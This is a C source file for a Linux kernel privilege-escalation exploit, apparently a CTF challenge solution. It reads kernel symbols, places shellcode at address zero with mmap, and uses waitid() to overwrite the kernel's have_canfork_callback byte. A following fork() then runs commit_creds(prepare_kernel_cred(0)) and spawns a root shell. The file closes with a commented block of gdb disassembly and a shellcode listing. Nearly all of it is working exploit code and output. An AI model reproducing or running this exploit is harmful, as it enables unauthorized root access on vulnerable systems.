#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>

struct cred;
struct task_struct;
 
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
 
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
void get_shell() {
	  //system("id");
    //system("cat /flag");    
  	char *argv[] = {"/bin/sh", NULL};
 
  	if (getuid() == 0){
    printf("[+] Root shell success !! :)\n");
    execve("/bin/sh", argv, NULL);
  }
  printf("[-] failed to get root shell :(\n");
}
 
void get_root() {
  if (commit_creds && prepare_kernel_cred)
    commit_creds(prepare_kernel_cred(0));
  // get_shell();
}
 
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;
 
  f = fopen("/tmp/kallsyms", "r");
  if (f == NULL) {
    printf("[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

int main()
{
	/*
	static const unsigned char shellcode[] = {
		0xFF, 0x24, 0x25, 0x08, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
	};
	unsigned char shllcode2[] = {0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,};
	*/
	unsigned char shellcode[] = 
  		{ 0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };
  void **get_root_offset = rawmemchr(shellcode, 0x42);
  (*get_root_offset) = get_root;
	siginfo_t *have_canfork_callback = 0xffffffff81f7bc3e;

	prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
	commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
	// printf("prepare_kernel_cred = %p\n", prepare_kernel_cred);
	// printf("commit_creds = %p\n", commit_creds);
	// have_canfork_callback offset <= rendre dynamique aussi
	
	pid_t     pid;
	/* siginfo_t info; */

// 1. 0地址处放置shellcode, 跳转到 get_root()
	printf("[+] Try to allocat 0x00000000...\n");
	if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
		printf("[-] Failed to allocat 0x00000000\n");
		return -1;
	}
	printf("[+] Allocation success !\n");

	memcpy(0, shellcode, sizeof(shellcode));
	// *(unsigned long*)sizeof(shellcode) = (unsigned long)get_root;
// 测试 fork() 是否可调用
	if(-1 == (pid = fork())) {
		perror("fork()");
		return EXIT_FAILURE;
	}

	if(pid == 0) {
		_exit(0xDEADBEEF);
		perror("son");
		return EXIT_FAILURE;
	}
// 2. waitid触发漏洞，修改 *have_canfork_callback 的第1字节为 0x11
	// siginfo_t *ptr = (siginfo_t*)strtoul(av[1], (char**)0, 0);
	waitid(P_PID, pid, have_canfork_callback, WEXITED | WSTOPPED | WCONTINUED);

// 3. 调用 fork, 会调用未初始化的 cgroup_subsys->can_fork , 执行0地址处的代码
	pid = fork();
	printf("fork_ret = %d\n", pid);	
	// get_shell();
	if (pid > 0)
		get_shell();
	// sleep(10);
	return EXIT_SUCCESS;
}


/*
（1）寻找关键地址
/ $ cat /tmp/kallsyms | grep cgroup_can_fork
ffffffff811235f0 T cgroup_can_fork

$ b *0xffffffff811235f0

gdb-peda$ x /40i 0xffffffff811235f0
=> 0xffffffff811235f0 <cgroup_can_fork>:	data16 data16 data16 xchg ax,ax
   0xffffffff811235f5 <cgroup_can_fork+5>:	push   rbp
   0xffffffff811235f6 <cgroup_can_fork+6>:	mov    esi,0xc
   0xffffffff811235fb <cgroup_can_fork+11>:	mov    rbp,rsp
   0xffffffff811235fe <cgroup_can_fork+14>:	push   r13
   0xffffffff81123600 <cgroup_can_fork+16>:	push   r12
   0xffffffff81123602 <cgroup_can_fork+18>:	push   rbx
   0xffffffff81123603 <cgroup_can_fork+19>:	mov    r12,rdi
   0xffffffff81123606 <cgroup_can_fork+22>:	lea    rdi,[rbp-0x28]
   0xffffffff8112360a <cgroup_can_fork+26>:	sub    rsp,0x18
   0xffffffff8112360e <cgroup_can_fork+30>:	mov    rax,QWORD PTR gs:0x28
   0xffffffff81123617 <cgroup_can_fork+39>:	mov    QWORD PTR [rbp-0x20],rax
   0xffffffff8112361b <cgroup_can_fork+43>:	xor    eax,eax
   0xffffffff8112361d <cgroup_can_fork+45>:	
    movzx  eax,WORD PTR [rip+0xe5861a]        # 0xffffffff81f7bc3e <have_canfork_callback>  	// 地址
   0xffffffff81123624 <cgroup_can_fork+52>:	mov    QWORD PTR [rbp-0x28],rax
   0xffffffff81123628 <cgroup_can_fork+56>:	
    call   0xffffffff8144e280 <find_first_bit>
   0xffffffff8112362d <cgroup_can_fork+61>:	cmp    eax,0xb
   0xffffffff81123630 <cgroup_can_fork+64>:	mov    ebx,eax
   0xffffffff81123632 <cgroup_can_fork+66>:	
    jle    0xffffffff81123651 <cgroup_can_fork+97>
   0xffffffff81123634 <cgroup_can_fork+68>:	
    jmp    0xffffffff811236a6 <cgroup_can_fork+182>
   0xffffffff81123636 <cgroup_can_fork+70>:	lea    edx,[rbx+0x1]
   0xffffffff81123639 <cgroup_can_fork+73>:	lea    rdi,[rbp-0x28]
   0xffffffff8112363d <cgroup_can_fork+77>:	mov    esi,0xc
   0xffffffff81123642 <cgroup_can_fork+82>:	movsxd rdx,edx
   0xffffffff81123645 <cgroup_can_fork+85>:	
    call   0xffffffff8144e3b0 <find_next_bit>
   0xffffffff8112364a <cgroup_can_fork+90>:	cmp    eax,0xb
   0xffffffff8112364d <cgroup_can_fork+93>:	mov    ebx,eax
   0xffffffff8112364f <cgroup_can_fork+95>:	
    jg     0xffffffff811236a6 <cgroup_can_fork+182>
   0xffffffff81123651 <cgroup_can_fork+97>:	movsxd rax,ebx
   0xffffffff81123654 <cgroup_can_fork+100>:	mov    rdi,r12
   0xffffffff81123657 <cgroup_can_fork+103>:	
    mov    rax,QWORD PTR [rax*8-0x7e198940]
   0xffffffff8112365f <cgroup_can_fork+111>:	call   QWORD PTR [rax+0x50]
   0xffffffff81123662 <cgroup_can_fork+114>:	test   eax,eax
   0xffffffff81123664 <cgroup_can_fork+116>:	
    je     0xffffffff81123636 <cgroup_can_fork+70>
   0xffffffff81123666 <cgroup_can_fork+118>:	test   ebx,ebx
   0xffffffff81123668 <cgroup_can_fork+120>:	
    mov    rdx,QWORD PTR [rip+0xd44051]        # 0xffffffff81e676c0 <cgroup_subsys>
   0xffffffff8112366f <cgroup_can_fork+127>:	
    jle    0xffffffff811236a8 <cgroup_can_fork+184>
   0xffffffff81123671 <cgroup_can_fork+129>:	lea    ecx,[rbx-0x1]
   0xffffffff81123674 <cgroup_can_fork+132>:	mov    r13,0xffffffff81e676c8
   0xffffffff8112367b <cgroup_can_fork+139>:	lea    rbx,[rcx*8-0x7e198930]

（2）shellcode 内容
pwndbg> x /20i 0
=> 0x0: mov    rax,0xffffffff81f3f45a
   0x7: mov    QWORD PTR [rax],0x0
   0xe: movabs rax,0x400a1f
   0x18:  call   rax
   0x1a:  xor    rax,rax
   0x1d:  ret


*/